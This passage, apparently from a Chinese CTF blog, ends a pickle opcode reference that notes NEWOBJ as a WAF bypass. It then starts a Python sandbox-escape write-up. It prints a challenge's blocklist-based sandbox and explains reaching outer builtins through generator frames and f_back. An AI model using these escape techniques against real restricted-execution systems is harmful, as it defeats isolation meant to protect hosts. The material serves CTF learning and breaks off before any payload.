class="line">\x53   S        STRING           压入字符串 (文本格式，引号包裹)</span><br><span class="line">\x54   T        BINSTRING        压入字符串 (二进制格式)</span><br><span class="line">\x55   U        SHORT_BINSTRING  压入短字符串 (长度 &lt; <span class="number">256</span>)</span><br><span class="line">\x56   V        UNICODE          压入 Unicode 字符串</span><br><span class="line">\x58   X        BINUNICODE       压入 Unicode 字符串 (二进制)</span><br><span class="line">\x5d   ]        EMPTY_LIST       压入一个空列表</span><br><span class="line">\x61   a        APPEND           将对象追加到列表 (stack[-<span class="number">1</span>] append to stack[-<span class="number">2</span>])</span><br><span class="line">\x62   b        BUILD            通过 setstate 或 <span class="built_in">dict</span> 更新构建对象</span><br><span class="line">\x63   c        GLOBAL           导入全局对象 (格式: module\nname\n)</span><br><span class="line">\x64   d        DICT             构建字典 (从 MARK 开始)</span><br><span class="line">\x65   e        APPENDS          扩展列表 (将切片扩展到列表)</span><br><span class="line">\x66   f        PUT              (已废弃) 同 PUT</span><br><span class="line">\x67   g        GET              从 Memo 获取对象 (文本索引)</span><br><span class="line">\x68   h        BINGET           从 Memo 获取对象 (<span class="number">1</span>字节二进制索引)</span><br><span class="line">\x69   i        INST             构建类实例 (相当于 c + o)</span><br><span class="line">\x6a   j        LONG_BINGET      从 Memo 获取对象 (<span class="number">4</span>字节二进制索引)</span><br><span class="line">\x6c   l        LIST             构建列表 (从 MARK 开始)</span><br><span class="line">\x6f   o        OBJ              构建类对象 (利用栈上的参数)</span><br><span class="line">\x70   p        PUT              存入 Memo (文本索引)</span><br><span class="line">\x71   q        BINPUT           存入 Memo (<span class="number">1</span>字节二进制索引)</span><br><span class="line">\x72   r        LONG_BINPUT      存入 Memo (<span class="number">4</span>字节二进制索引)</span><br><span class="line">\x73   s        SETITEM          字典赋值 (d[k]=v)</span><br><span class="line">\x74   t        TUPLE            构建元组 (从 MARK 开始)</span><br><span class="line">\x75   u        SETITEMS         字典批量赋值</span><br><span class="line">\x7d   &#125;        EMPTY_DICT       压入一个空字典</span><br><span class="line"></span><br><span class="line"><span class="comment"># 二进制扩展指令 (Protocol 2, 3, 4+) - 无 ASCII 对应</span></span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">\x80   N/A      PROTO            声明协议版本 (如 \x80\x03)</span><br><span class="line">\x81   N/A      NEWOBJ           实例化类 (调用 __new__，WAF 绕过神器)</span><br><span class="line">\x82   N/A      EXT1             扩展代码 (<span class="number">1</span>字节)</span><br><span class="line">\x83   N/A      EXT2             扩展代码 (<span class="number">2</span>字节)</span><br><span class="line">\x84   N/A      EXT4             扩展代码 (<span class="number">4</span>字节)</span><br><span class="line">\x85   N/A      TUPLE1           构建单元素元组 (无需 MARK)</span><br><span class="line">\x86   N/A      TUPLE2           构建双元素元组 (无需 MARK)</span><br><span class="line">\x87   N/A      TUPLE3           构建三元素元组 (无需 MARK)</span><br><span class="line">\x88   N/A      NEWTRUE          压入 <span class="literal">True</span></span><br><span class="line">\x89   N/A      NEWFALSE         压入 <span class="literal">False</span></span><br><span class="line">\x8a   N/A      LONG1            长整数 (<span class="number">1</span>字节长度前缀)</span><br><span class="line">\x8b   N/A      LONG4            长整数 (<span class="number">4</span>字节长度前缀)</span><br><span class="line">\x8c   N/A      SHORT_BINUNICODE 短 Unicode 字符串 (长度 &lt; <span class="number">256</span>)</span><br><span class="line">\x8d   N/A      BINUNICODE8      长 Unicode 字符串 (<span class="number">8</span>字节长度前缀)</span><br><span class="line">\x8e   N/A      BINBYTES8        长 Bytes 对象 (<span class="number">8</span>字节长度前缀)</span><br><span class="line">\x8f   N/A      EMPTY_SET        压入空集合 (<span class="type">Set</span>)</span><br><span class="line">\x90   N/A      ADDITEMS         向集合添加元素</span><br><span class="line">\x91   N/A      FROZENSET        构建不可变集合 (Frozenset)</span><br><span class="line">\x92   N/A      NEWOBJ_EX        实例化类 (带关键字参数)</span><br><span class="line">\x93   N/A      STACK_GLOBAL     栈上导入全局对象 (Protocol <span class="number">4</span>+)</span><br><span class="line">\x94   N/A      MEMOIZE          自动存入 Memo (无需指定索引)</span><br><span class="line">\x95   N/A      FRAME            帧标记 (用于分块传输)</span><br><span class="line">\x96   N/A      BYTEARRAY8       压入 ByteArray 对象</span><br><span class="line">\x97   N/A      NEXT_BUFFER      压入带外缓冲区 (Pickle <span class="number">5</span>)</span><br><span class="line">\x98   N/A      READONLY_BUFFER  设为只读缓冲区 (Pickle <span class="number">5</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> pickle </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python沙箱逃逸</title>
      <link href="/2025/12/29/python-sandbox/"/>
      <url>/2025/12/29/python-sandbox/</url>
      
        <content type="html"><![CDATA[<h1 id="Python-沙箱逃逸"><a href="#Python-沙箱逃逸" class="headerlink" title="Python 沙箱逃逸"></a>Python 沙箱逃逸</h1><h3 id="栈帧逃逸"><a href="#栈帧逃逸" class="headerlink" title="栈帧逃逸"></a>栈帧逃逸</h3><h5 id="2025-mini-L-pybox"><a href="#2025-mini-L-pybox" class="headerlink" title="2025 mini-L pybox"></a>2025 mini-L pybox</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SandboxVisitor</span>(ast.NodeVisitor):</span><br><span class="line">    forbidden_attrs = &#123;</span><br><span class="line">        <span class="string">&quot;__class__&quot;</span>, <span class="string">&quot;__dict__&quot;</span>, <span class="string">&quot;__bases__&quot;</span>, <span class="string">&quot;__mro__&quot;</span>, <span class="string">&quot;__subclasses__&quot;</span>,</span><br><span class="line">        <span class="string">&quot;__globals__&quot;</span>, <span class="string">&quot;__code__&quot;</span>, <span class="string">&quot;__closure__&quot;</span>, <span class="string">&quot;__func__&quot;</span>, <span class="string">&quot;__self__&quot;</span>,</span><br><span class="line">        <span class="string">&quot;__module__&quot;</span>, <span class="string">&quot;__import__&quot;</span>, <span class="string">&quot;__builtins__&quot;</span>, <span class="string">&quot;__base__&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">visit_Attribute</span>(<span class="params">self, node</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(node.attr, <span class="built_in">str</span>) <span class="keyword">and</span> node.attr <span class="keyword">in</span> <span class="variable language_">self</span>.forbidden_attrs:</span><br><span class="line">            <span class="keyword">raise</span> ValueError</span><br><span class="line">        <span class="variable language_">self</span>.generic_visit(node)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">visit_GeneratorExp</span>(<span class="params">self, node</span>):</span><br><span class="line">        <span class="keyword">raise</span> ValueError</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sandbox_executor</span>(<span class="params">code, result_queue</span>):</span><br><span class="line">    safe_builtins = &#123;</span><br><span class="line">        <span class="string">&quot;print&quot;</span>: <span class="built_in">print</span>,</span><br><span class="line">        <span class="string">&quot;filter&quot;</span>: <span class="built_in">filter</span>,</span><br><span class="line">        <span class="string">&quot;list&quot;</span>: <span class="built_in">list</span>,</span><br><span class="line">        <span class="string">&quot;len&quot;</span>: <span class="built_in">len</span>,</span><br><span class="line">        <span class="string">&quot;addaudithook&quot;</span>: sys.addaudithook,</span><br><span class="line">        <span class="string">&quot;Exception&quot;</span>: Exception,</span><br><span class="line">    &#125;</span><br><span class="line">    safe_globals = &#123;<span class="string">&quot;__builtins__&quot;</span>: safe_builtins&#125;</span><br><span class="line"></span><br><span class="line">    sys.stdout = io.StringIO()</span><br><span class="line">    sys.stderr = io.StringIO()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">exec</span>(code, safe_globals)</span><br><span class="line">        output = sys.stdout.getvalue()</span><br><span class="line">        error = sys.stderr.getvalue()</span><br><span class="line">        <span class="keyword">if</span> error:</span><br><span class="line">            result_queue.put((<span class="string">&quot;err&quot;</span>, error))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result_queue.put((<span class="string">&quot;ok&quot;</span>, output))</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">import</span> traceback</span><br><span class="line">        result_queue.put((<span class="string">&quot;err&quot;</span>, traceback.format_exc()))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">safe_exec</span>(<span class="params">code: <span class="built_in">str</span>, timeout=<span class="number">2</span></span>):</span><br><span class="line">    code = code.encode().decode(<span class="string">&#x27;unicode_escape&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        tree = ast.parse(code)</span><br><span class="line">        SandboxVisitor().visit(tree)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;Error: AST check failed (<span class="subst">&#123;e.__class__.__name__&#125;</span>)&quot;</span></span><br><span class="line"></span><br><span class="line">    result_queue = multiprocessing.Queue()</span><br><span class="line">    p = multiprocessing.Process(target=sandbox_executor, args=(code, result_queue))</span><br><span class="line">    p.start()</span><br><span class="line">    p.join(timeout=timeout)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> p.is_alive():</span><br><span class="line">        p.terminate()</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Timeout: code took too long to run.&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        status, output = result_queue.get_nowait()</span><br><span class="line">        <span class="built_in">print</span>(output)</span><br><span class="line">        <span class="keyword">return</span> output <span class="keyword">if</span> status == <span class="string">&quot;ok&quot;</span> <span class="keyword">else</span> <span class="string">f&quot;Error exec: <span class="subst">&#123;output&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Error: no output from sandbox.&quot;</span></span><br><span class="line"></span><br><span class="line">CODE = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">def my_audit_checker(event,args):</span></span><br><span class="line"><span class="string">    allowed_events = [&quot;import&quot;, &quot;time.sleep&quot;, &quot;builtins.input&quot;, &quot;builtins.input/result&quot;]</span></span><br><span class="line"><span class="string">    if not list(filter(lambda x: event == x, allowed_events)):</span></span><br><span class="line"><span class="string">        raise Exception</span></span><br><span class="line"><span class="string">    if len(args) &gt; 0:</span></span><br><span class="line"><span class="string">        raise Exception</span></span><br><span class="line"><span class="string">addaudithook(my_audit_checker)</span></span><br><span class="line"><span class="string">print(&quot;&#123;&#125;&quot;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">badchars = <span class="string">&quot;\&quot;&#x27;|&amp;`+-*/()[]&#123;&#125;_ .&quot;</span>.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">evaluate_wish_text</span>(<span class="params">text: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> badchars:</span><br><span class="line">        <span class="keyword">if</span> ch <span class="keyword">in</span> text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;ch=<span class="subst">&#123;ch&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">f&quot;Error:waf <span class="subst">&#123;ch&#125;</span>&quot;</span></span><br><span class="line">    out = safe_exec(CODE.<span class="built_in">format</span>(text))</span><br><span class="line">    <span class="keyword">return</span> out</span><br></pre></td></tr></table></figure><h5 id="知识补充：python中的生成器"><a href="#知识补充：python中的生成器" class="headerlink" title="知识补充：python中的生成器"></a>知识补充：python中的生成器</h5><p>使用了yield的函数被称为生成器</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">running_averager</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;一个计算动态平均值的协程 (Coroutine)&quot;&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;--- 平均值计算器已启动 ---&quot;</span>)</span><br><span class="line">    <span class="comment"># 初始化状态变量</span></span><br><span class="line">    total = <span class="number">0.0</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    average = <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="comment"># 关键部分！</span></span><br><span class="line">        <span class="comment"># 1. 向调用方产出当前的 average 值</span></span><br><span class="line">        <span class="comment"># 2. 暂停，等待调用方下一次 send() 一个值进来</span></span><br><span class="line">        <span class="comment"># 3. term 会接收到 send() 进来的值</span></span><br><span class="line">        term = <span class="keyword">yield</span> average</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 如果接收到 None，则跳过此次计算 (通常用于启动)</span></span><br><span class="line">        <span class="keyword">if</span> term <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">            </span><br><span class="line">        <span class="comment"># 用接收到的值更新状态</span></span><br><span class="line">        total += term</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        average = total / count</span><br></pre></td></tr></table></figure><p>生成器并不是一个函数,使用括号执行时生成一个生成器对象：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f_</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    <span class="keyword">yield</span></span><br><span class="line"></span><br><span class="line">x = f()</span><br><span class="line">x_ = f_</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(x),<span class="built_in">type</span>(x_))</span><br><span class="line"><span class="comment"># &lt;class &#x27;generator&#x27;&gt; &lt;class &#x27;function&#x27;&gt;</span></span><br></pre></td></tr></table></figure><p>看看它和函数有哪些实例变量的差别，</p><p>需要注意的是，python中方法也属于一种属性</p><p>生成器对象的全部实例变量：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">[</span>&#x27;__repr__&#x27;<span class="punctuation">,</span> &#x27;__getattribute__&#x27;<span class="punctuation">,</span> &#x27;__iter__&#x27;<span class="punctuation">,</span> &#x27;__next__&#x27;<span class="punctuation">,</span> &#x27;__del__&#x27;<span class="punctuation">,</span> &#x27;send&#x27;<span class="punctuation">,</span> &#x27;throw&#x27;<span class="punctuation">,</span> &#x27;close&#x27;<span class="punctuation">,</span> &#x27;__sizeof__&#x27;<span class="punctuation">,</span> &#x27;gi_code&#x27;<span class="punctuation">,</span> &#x27;__name__&#x27;<span class="punctuation">,</span> &#x27;__qualname__&#x27;<span class="punctuation">,</span> &#x27;gi_yieldfrom&#x27;<span class="punctuation">,</span> &#x27;gi_running&#x27;<span class="punctuation">,</span> &#x27;gi_frame&#x27;<span class="punctuation">,</span> &#x27;gi_suspended&#x27;<span class="punctuation">,</span> &#x27;__doc__&#x27;<span class="punctuation">,</span> &#x27;__new__&#x27;<span class="punctuation">,</span> &#x27;__hash__&#x27;<span class="punctuation">,</span> &#x27;__str__&#x27;<span class="punctuation">,</span> &#x27;__setattr__&#x27;<span class="punctuation">,</span> &#x27;__delattr__&#x27;<span class="punctuation">,</span> &#x27;__lt__&#x27;<span class="punctuation">,</span> &#x27;__le__&#x27;<span class="punctuation">,</span> &#x27;__eq__&#x27;<span class="punctuation">,</span> &#x27;__ne__&#x27;<span class="punctuation">,</span> &#x27;__gt__&#x27;<span class="punctuation">,</span> &#x27;__ge__&#x27;<span class="punctuation">,</span> &#x27;__init__&#x27;<span class="punctuation">,</span> &#x27;__reduce_ex__&#x27;<span class="punctuation">,</span> &#x27;__reduce__&#x27;<span class="punctuation">,</span> &#x27;__getstate__&#x27;<span class="punctuation">,</span> &#x27;__subclasshook__&#x27;<span class="punctuation">,</span> &#x27;__init_subclass__&#x27;<span class="punctuation">,</span> &#x27;__format__&#x27;<span class="punctuation">,</span> &#x27;__dir__&#x27;<span class="punctuation">,</span> &#x27;__class__&#x27;<span class="punctuation">]</span></span><br></pre></td></tr></table></figure><p>普通函数的全部实例变量：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">[</span>&#x27;__new__&#x27;<span class="punctuation">,</span> &#x27;__repr__&#x27;<span class="punctuation">,</span> &#x27;__call__&#x27;<span class="punctuation">,</span> &#x27;__get__&#x27;<span class="punctuation">,</span> &#x27;__closure__&#x27;<span class="punctuation">,</span> &#x27;__doc__&#x27;<span class="punctuation">,</span> &#x27;__globals__&#x27;<span class="punctuation">,</span> &#x27;__module__&#x27;<span class="punctuation">,</span> &#x27;__builtins__&#x27;<span class="punctuation">,</span> &#x27;__code__&#x27;<span class="punctuation">,</span> &#x27;__defaults__&#x27;<span class="punctuation">,</span> &#x27;__kwdefaults__&#x27;<span class="punctuation">,</span> &#x27;__annotations__&#x27;<span class="punctuation">,</span> &#x27;__dict__&#x27;<span class="punctuation">,</span> &#x27;__name__&#x27;<span class="punctuation">,</span> &#x27;__qualname__&#x27;<span class="punctuation">,</span> &#x27;__hash__&#x27;<span class="punctuation">,</span> &#x27;__str__&#x27;<span class="punctuation">,</span> &#x27;__getattribute__&#x27;<span class="punctuation">,</span> &#x27;__setattr__&#x27;<span class="punctuation">,</span> &#x27;__delattr__&#x27;<span class="punctuation">,</span> &#x27;__lt__&#x27;<span class="punctuation">,</span> &#x27;__le__&#x27;<span class="punctuation">,</span> &#x27;__eq__&#x27;<span class="punctuation">,</span> &#x27;__ne__&#x27;<span class="punctuation">,</span> &#x27;__gt__&#x27;<span class="punctuation">,</span> &#x27;__ge__&#x27;<span class="punctuation">,</span> &#x27;__init__&#x27;<span class="punctuation">,</span> &#x27;__reduce_ex__&#x27;<span class="punctuation">,</span> &#x27;__reduce__&#x27;<span class="punctuation">,</span> &#x27;__getstate__&#x27;<span class="punctuation">,</span> &#x27;__subclasshook__&#x27;<span class="punctuation">,</span> &#x27;__init_subclass__&#x27;<span class="punctuation">,</span> &#x27;__format__&#x27;<span class="punctuation">,</span> &#x27;__sizeof__&#x27;<span class="punctuation">,</span> &#x27;__dir__&#x27;<span class="punctuation">,</span> &#x27;__class__&#x27;<span class="punctuation">]</span></span><br></pre></td></tr></table></figure><p>它们共有的属性：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    <span class="string">&#x27;__qualname__&#x27;</span>,       <span class="comment"># (Qualified Name) 对象的“完全限定名称”，包含了从模块顶层到该对象的路径。</span></span><br><span class="line">    <span class="string">&#x27;__setattr__&#x27;</span>,        <span class="comment"># (Set Attribute) 当试图通过赋值语句 (obj.x = 10) 设置属性时被调用。</span></span><br><span class="line">    <span class="string">&#x27;__subclasshook__&#x27;</span>,   <span class="comment"># 用于自定义 issubclass() 的行为。</span></span><br><span class="line">    <span class="string">&#x27;__eq__&#x27;</span>,             <span class="comment"># (Equal) 定义等于运算符 `==` 的行为。</span></span><br><span class="line">    <span class="string">&#x27;__ne__&#x27;</span>,             <span class="comment"># (Not Equal) 定义不等于运算符 `!=` 的行为。</span></span><br><span class="line">    <span class="string">&#x27;__dir__&#x27;</span>,            <span class="comment"># 定义 dir(obj) 函数的返回内容，即对象的属性列表。</span></span><br><span class="line">    <span class="string">&#x27;__init_subclass__&#x27;</span>,  <span class="comment"># 当该类被子类化时，在子类上调用的钩子。</span></span><br><span class="line">    <span class="string">&#x27;__init__&#x27;</span>,           <span class="comment"># (Initialize) 对象的构造器（初始化方法），在对象创建后被调用。</span></span><br><span class="line">    <span class="string">&#x27;__sizeof__&#x27;</span>,         <span class="comment"># 返回对象占用的内存大小（字节）。</span></span><br><span class="line">    <span class="string">&#x27;__le__&#x27;</span>,             <span class="comment"># (Less or Equal) 定义小于等于运算符 `&lt;=` 的行为。</span></span><br><span class="line">    <span class="string">&#x27;__name__&#x27;</span>,           <span class="comment"># 对象的名称。对于函数，就是函数名。</span></span><br><span class="line">    <span class="string">&#x27;__ge__&#x27;</span>,             <span class="comment"># (Greater or Equal) 定义大于等于运算符 `&gt;=` 的行为。</span></span><br><span class="line">    <span class="string">&#x27;__reduce__&#x27;</span>,         <span class="comment"># 在对象被 pickle 序列化时使用。</span></span><br><span class="line">    <span class="string">&#x27;__reduce_ex__&#x27;</span>,      <span class="comment"># 在对象被 pickle 序列化时使用 (扩展版)。</span></span><br><span class="line">    <span class="string">&#x27;__repr__&#x27;</span>,           <span class="comment"># (Representation) 定义 repr(obj) 的输出，目标是明确、无歧义。</span></span><br><span class="line">    <span class="string">&#x27;__getstate__&#x27;</span>,       <span class="comment"># 在 pickle 序列化时，用于指定应该被保存的状态。</span></span><br><span class="line">    <span class="string">&#x27;__class__&#x27;</span>,          <span class="comment"># 指向该实例所属的类。</span></span><br><span class="line">    <span class="string">&#x27;__doc__&#x27;</span>,            <span class="comment"># (Documentation String) 对象的文档字符串（docstring）。</span></span><br><span class="line">    <span class="string">&#x27;__gt__&#x27;</span>,             <span class="comment"># (Greater Than) 定义大于运算符 `&gt;` 的行为。</span></span><br><span class="line">    <span class="string">&#x27;__str__&#x27;</span>,            <span class="comment"># (String) 定义 str(obj) 和 print(obj) 的输出，目标是可读性好。</span></span><br><span class="line">    <span class="string">&#x27;__delattr__&#x27;</span>,        <span class="comment"># (Delete Attribute) 当试图用 del obj.x 删除属性时被调用。</span></span><br><span class="line">    <span class="string">&#x27;__new__&#x27;</span>,            <span class="comment"># (New Instance) 在 __init__ 之前被调用，是真正创建实例的静态方法。</span></span><br><span class="line">    <span class="string">&#x27;__hash__&#x27;</span>,           <span class="comment"># 计算对象的哈希值，用于字典键或集合元素。</span></span><br><span class="line">    <span class="string">&#x27;__format__&#x27;</span>,         <span class="comment"># 定义格式化字符串的行为 (例如 `&quot;&#123;:0.2f&#125;&quot;.format(obj)`)。</span></span><br><span class="line">    <span class="string">&#x27;__lt__&#x27;</span>,             <span class="comment"># (Less Than) 定义小于运算符 `&lt;` 的行为。</span></span><br><span class="line">    <span class="string">&#x27;__getattribute__&#x27;</span>,   <span class="comment"># (Get Attribute) 无条件地拦截所有属性访问 (obj.x)。</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>生成器有而普通函数没有的：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    <span class="string">&#x27;gi_code&#x27;</span>,        <span class="comment"># (Generator Code) 指向该生成器对应的代码对象 (compiled bytecode)。</span></span><br><span class="line">    <span class="string">&#x27;__del__&#x27;</span>,        <span class="comment"># (Delete/Destructor) 对象的析构函数，当对象被垃圾回收时调用。</span></span><br><span class="line">    <span class="string">&#x27;send&#x27;</span>,           <span class="comment"># [核心方法] 向生成器发送一个值，并从 yield 处恢复执行。</span></span><br><span class="line">    <span class="string">&#x27;__iter__&#x27;</span>,       <span class="comment"># 使生成器成为一个迭代器，返回它自身。</span></span><br><span class="line">    <span class="string">&#x27;close&#x27;</span>,          <span class="comment"># [核心方法] 关闭生成器，用于执行清理代码。</span></span><br><span class="line">    <span class="string">&#x27;gi_suspended&#x27;</span>,   <span class="comment"># (Generator Suspended) 布尔值，True 表示生成器当前在 yield 处暂停。</span></span><br><span class="line">    <span class="string">&#x27;throw&#x27;</span>,          <span class="comment"># [核心方法] 在生成器暂停的位置抛出一个指定的异常。</span></span><br><span class="line">    <span class="string">&#x27;__next__&#x27;</span>,       <span class="comment"># 使生成器成为一个迭代器，获取下一个 yield 的值。</span></span><br><span class="line">    <span class="string">&#x27;gi_running&#x27;</span>,     <span class="comment"># (Generator Running) 布尔值，True 表示生成器当前正在执行中。</span></span><br><span class="line">    <span class="string">&#x27;gi_frame&#x27;</span>,       <span class="comment"># (Generator Frame) 指向生成器当前的帧对象 (frame object)，包含执行上下文。</span></span><br><span class="line">    <span class="string">&#x27;gi_yieldfrom&#x27;</span>,   <span class="comment"># (Generator Yield From) 如果在使用 yield from，则指向子生成器。</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>普通函数有而生成器没有的：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    <span class="string">&#x27;__code__&#x27;</span>,         <span class="comment"># 函数的代码对象，包含了编译后的字节码、常量、变量名等。</span></span><br><span class="line">    <span class="string">&#x27;__annotations__&#x27;</span>,  <span class="comment"># 一个字典，包含了函数参数和返回值的类型注解。</span></span><br><span class="line">    <span class="string">&#x27;__globals__&#x27;</span>,      <span class="comment"># 一个字典，引用了函数定义时所在模块的全局命名空间。</span></span><br><span class="line">    <span class="string">&#x27;__kwdefaults__&#x27;</span>,   <span class="comment"># 一个字典，包含仅限关键字参数 (keyword-only arguments) 的默认值。</span></span><br><span class="line">    <span class="string">&#x27;__module__&#x27;</span>,       <span class="comment"># 函数定义所在的模块名称 (字符串)。</span></span><br><span class="line">    <span class="string">&#x27;__builtins__&#x27;</span>,     <span class="comment"># 引用了函数执行时可以访问的内建函数模块 `__builtins__`。</span></span><br><span class="line">    <span class="string">&#x27;__closure__&#x27;</span>,      <span class="comment"># 一个元组，包含了函数的闭包 (closure) 信息。</span></span><br><span class="line">    <span class="string">&#x27;__call__&#x27;</span>,         <span class="comment"># 使函数对象成为可调用 (callable) 的。执行 func() 即调用此方法。</span></span><br><span class="line">    <span class="string">&#x27;__dict__&#x27;</span>,         <span class="comment"># 函数的属性字典，允许你给函数附加任意属性。</span></span><br><span class="line">    <span class="string">&#x27;__defaults__&#x27;</span>,     <span class="comment"># 一个元组，包含了函数位置参数 (positional arguments) 的默认值。</span></span><br><span class="line">    <span class="string">&#x27;__get__&#x27;</span>,          <span class="comment"># [描述符协议] 让函数在被实例调用时转变为方法，并自动传入 self。</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><p><strong>与直觉相悖的</strong>：生成器的”帧对象“中的“帧”并不是从 创建&#x2F;send()&#x2F;next() 开始，从yield结束。</p><p><strong>实际上</strong>：在创建生成器对象时创建的，持久的、包含完整执行上下文的数据结构。它是生成器能够暂停和恢复的状态容器。</p><p>相当于生成器对象的存档文件</p><p>获取帧对象：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>():</span><br><span class="line">    <span class="keyword">yield</span></span><br><span class="line"></span><br><span class="line">x = f()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(x.gi_frame)</span><br></pre></td></tr></table></figure><p>这个frame的一些独特属性：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">    <span class="string">&#x27;f_code&#x27;</span>,           <span class="comment"># 帧所关联的代码对象 (包含了字节码、常量等)。</span></span><br><span class="line">    <span class="string">&#x27;clear&#x27;</span>,            <span class="comment"># [方法] 清除帧中对局部变量的所有引用，用于打破循环引用，帮助垃圾回收。</span></span><br><span class="line">    <span class="string">&#x27;f_back&#x27;</span>,           <span class="comment"># 指向调用栈中的“上一个帧” (即调用者的帧)。</span></span><br><span class="line">    <span class="string">&#x27;f_locals&#x27;</span>,         <span class="comment"># 包含该帧的“局部变量”的字典。</span></span><br><span class="line">    <span class="string">&#x27;f_lasti&#x27;</span>,          <span class="comment"># (Last Instruction) 最后执行的字节码指令在 f_code 中的索引。</span></span><br><span class="line">    <span class="string">&#x27;f_lineno&#x27;</span>,         <span class="comment"># (Line Number) 代码在源文件中当前执行的“行号”。</span></span><br><span class="line">    <span class="string">&#x27;f_trace_opcodes&#x27;</span>,  <span class="comment"># 布尔值，如果为 True，则为每个操作码(opcode)都触发跟踪事件，用于精细调试。</span></span><br><span class="line">    <span class="string">&#x27;f_trace&#x27;</span>,          <span class="comment"># 调试或性能分析时设置的“跟踪函数”(trace function)，可以为 None。</span></span><br><span class="line">    <span class="string">&#x27;f_builtins&#x27;</span>,       <span class="comment"># 帧执行时所引用的“内建命名空间”的字典。</span></span><br><span class="line">    <span class="string">&#x27;f_globals&#x27;</span>,        <span class="comment"># 帧执行时所引用的“全局命名空间”的字典 (通常是模块的命名空间)。</span></span><br><span class="line">    <span class="string">&#x27;f_trace_lines&#x27;</span>,    <span class="comment"># 布尔值，控制跟踪事件是否在行号改变时触发 (默认为 True)。</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>python在每一次的函数调用执行时，都会自动创建一个新的帧对象</p><p>python的执行过程可以看做是一个“帧栈”，可以类比php反序列化中pop链，或者递归函数的知识</p><p>注意到这里<code>f_back</code>可以获取到上一个帧，也就是说如果不限制获取帧对象和获取上一帧。那么我们就可以利用栈帧拿到最外层的<code>__builtins__</code>，这就是栈帧逃逸</p><p>以我们上一个题目举例子，除了外部限制之外，还有内部对事件的限制</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">my_audit_checker</span>(<span class="params">event,args</span>):</span><br><span class="line">    allowed_events = [<span class="string">&quot;import&quot;</span>, <span class="string">&quot;time.sleep&quot;</span>, <span class="string">&quot;builtins.input&quot;</span>, <span class="string">&quot;builtins.input/result&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> x: event == x, allowed_events)):</span><br><span class="line">        <span class="keyword">raise</span> Exception</span><br><span class="line">    <span class="keyword">if</span> <span 